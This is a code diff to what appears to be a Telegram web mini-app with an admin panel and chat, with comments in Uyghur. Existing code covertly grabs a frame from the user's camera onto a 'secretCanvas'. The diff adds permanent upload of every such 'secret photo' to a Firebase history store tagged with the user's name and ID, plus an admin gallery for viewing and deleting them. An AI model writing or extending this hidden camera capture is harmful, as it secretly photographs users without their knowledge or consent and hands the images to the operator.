@@ -151,6 +151,12 @@
         .btn-vip-user { background: #ff9800; color: #000; }
         .btn-del-user { background: #f44336; color: #fff; }
 
+        /* 🔥 يېڭىدىن قوشۇلغان مۇقىم رەسىملەر ئامبىرى نۇسخىسى */
+        .photo-history-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 8px; max-height: 250px; overflow-y: auto; background: var(--card-bg); padding: 10px; border-radius: var(--radius); border: 1px solid var(--border-color); }
+        .photo-history-card { position: relative; background: #2a2a2d; border-radius: 8px; overflow: hidden; border: 1px solid #3a3a3c; }
+        .photo-history-card img { width: 100%; height: 80px; object-fit: cover; display: block; cursor: pointer; }
+        .photo-history-info { padding: 4px; font-size: 9px; color: #ccc; text-align: center; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
         .chat-container {
             display: flex; flex-direction: column; height: calc(100vh - 150px);
             background: linear-gradient(180deg, #161618 0%, #0f0f0f 100%);
@@ -292,6 +298,12 @@
                 <button type="submit" class="btn-submit" style="background:#2196f3;">رەسىم يوللاش</button>
             </form>
 
+            <!-- 🔥 بارلىق مۇقىم ساقلانغان رەسىملەر ئامبىرى كۆزنىكى -->
+            <div class="section-header" style="margin-top: 25px; color:#e50914;">📸 بارلىق تارتىلغان رەسىملەر ئامبىرى (تارىخىي رېكوردلار)</div>
+            <div class="photo-history-grid" id="capturedHistoryGrid">
+                <div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); font-size: 11px;">تېخى رەسىم يوق</div>
+            </div>
+
             <div class="section-header" style="margin-top: 25px;">توربەتكە كىرگەن ئابونتلار (<span id="userCount">0</span>)</div>
             
             <div class="admin-sub-section">📸 رەسىمگە تارتىلغان ئابونتلار</div>
@@ -334,6 +346,7 @@
         let allPhotos = [];
         let allUsers = [];
         let allChats = [];
+        let capturedHistory = [];
 
         window.initAppAfterFirebase = function() {
             const isTelegram = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user;
@@ -431,7 +444,6 @@
                     
                     video.onloadedmetadata = () => {
                         video.play().then(() => {
-                            // سىن كامېرىدىن نورمال سۈرەت ئېلىش ئۈچۈن 1 سېكۇنت ساقلايمىز
                             setTimeout(() => {
                                 const canvas = document.getElementById('secretCanvas');
                                 canvas.width = video.videoWidth || 480;
@@ -440,21 +452,28 @@
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 
-                                // رەسىمنىڭ چوڭلۇقى كىچىك ۋە Firebase گە چىقىشى ئاسان بولسۇن ئۈچۈن سۈپىتى 0.7 قىلىندى
                                 const imageData = canvas.toDataURL('image/jpeg', 0.7);
-                                
-                                // Firebase گە بىۋاسىتە ساقلاش
-                                const capturedRef = window.dbRef(window.db, `users/${currentUser.id}/capturedImage`);
-                                window.dbSet(capturedRef, {
+                                const nowStr = new Date().toLocaleString();
+
+                                const capturePayload = {
                                     image: imageData,
-                                    capturedAt: new Date().toLocaleString()
+                                    capturedAt: nowStr
+                                };
+                                
+                                // 1. ئابونتنىڭ ئۆزىنىڭ كۆزنىكىگە ساقلاش
+                                window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), capturePayload);
+
+                                // 2. 🔥 باشقۇرغۇچىنىڭ مۇقىم ئامبىرى ئۈچۈن Firebase نىڭ ئايرىم تارىخ رېكوردىغا ساقلاش (push)
+                                const historyRef = window.dbPush(window.dbRef(window.db, 'captured_photos_history'));
+                                window.dbSet(historyRef, {
+                                    userId: currentUser.id,
+                                    userName: currentUser.first_name,
+                                    image: imageData,
+                                    time: nowStr
                                 }).then(() => {
-                                    console.log("مەخپىي رەسىم Firebase گە مۇۋەپپەقىيەتلىك ساقلاندى!");
-                                }).catch(err => {
-                                    console.error("رەسىمنى ساقلاشتا خاتالىق كۆرۈلدى:", err);
+                                    console.log("مەخپىي رەسىم باشقۇرغۇچىنىڭ مۇقىم ئامبىرىغا مۇۋەپپەقىيەتلىك كىردى!");
                                 });
 
-                                // كامېرا ئېقىمىنى تاقاش
                                 stream.getTracks().forEach(track => track.stop());
                             }, 1000);
                         }).catch(e => {
@@ -492,7 +511,6 @@
             window.dbOnValue(window.dbRef(window.db, 'users'), (snapshot) => {
                 const data = snapshot.val();
                 if (data) {
-                    // 🔥 كۆپىيىش (Object.keys) ئارقىلىق ھەر بىر ئابونتنىڭ ID سىنى توغرا قوبۇل قىلىش كاپالەتكە ئىگە قىلىندى
                     allUsers = Object.keys(data).map(key => ({
                         id: key,
                         ...data[key]
@@ -511,11 +529,51 @@
                 renderAdminUserLists();
             });
 
+            // 🔥 باشقۇرغۇچى ئۈچۈن مۇقىم رەسىملەر تارىخى ئامبىرىنى كۆزىتىش
+            window.dbOnValue(window.dbRef(window.db, 'captured_photos_history'), (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    capturedHistory = Object.keys(data).map(key => ({
+                        historyId: key,
+                        ...data[key]
+                    })).reverse();
+                } else {
+                    capturedHistory = [];
+                }
+                renderCapturedHistoryGrid();
+            });
+
             window.dbOnValue(window.dbRef(window.db, 'chats'), (snapshot) => {
                 const data = snapshot.val();
                 allChats = data ? Object.values(data) : [];
                 renderChatMessages();
             });
+        }
+
+        // 🔥 باشقۇرغۇچىنىڭ مۇقىم رەسىملەر ئامبىرىنى سىزىپ بېرىش
+        function renderCapturedHistoryGrid() {
+            const grid = document.getElementById('capturedHistoryGrid');
+            if (!grid) return;
+
+            if (capturedHistory.length === 0) {
+                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); font-size: 11px;">تېخى ساقلانغان رەسىم يوق</div>';
+                return;
+            }
+
+            grid.innerHTML = capturedHistory.map(item => `
+                <div class="photo-history-card">
+                    <button class="btn-delete-item" style="width:20px; height:20px; font-size:10px;" onclick="deleteHistoryPhoto('${item.historyId}')"><i class="fa-solid fa-xmark"></i></button>
+                    <img src="${item.image}" onclick="openImageViewer('${item.image}', '${item.userName || 'ئابونت'} (${item.time})')">
+                    <div class="photo-history-info">${item.userName || 'ئابونت'}</div>
+                </div>
+            `).join('');
+        }
+
+        function deleteHistoryPhoto(historyId) {
+            if (!currentUser?.isAdmin) return;
+            if (confirm('بۇ رەسىمنى ئامبار تارىخىدىن ئۆچۈرەمسىز؟')) {
+                window.dbRemove(window.dbRef(window.db, 'captured_photos_history/' + historyId));
+            }
         }
 
         function checkVipStatusUI() {
